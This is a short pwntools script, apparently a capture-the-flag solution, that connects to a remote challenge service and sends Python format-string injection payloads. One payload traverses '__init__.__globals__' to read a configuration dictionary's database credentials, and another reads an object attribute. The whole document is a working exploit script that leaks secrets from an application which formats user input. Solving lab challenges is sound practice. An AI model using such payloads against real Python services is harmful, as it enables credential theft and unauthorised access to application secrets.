from pwn import *

# nc -v 103.152.242.68 10061
HOST = "103.152.242.68"
PORT = 10061

io = remote(HOST, PORT)

payload = [
    b"{people_obj.__init__.__globals__[CONFIG][DATABASE][CREDENTIALS][DESCRIPTION][1]}",
    b"{people_obj.description}",
]

for p in payload:
    io.sendlineafter(b">>> ", p)
    print(io.recvline())
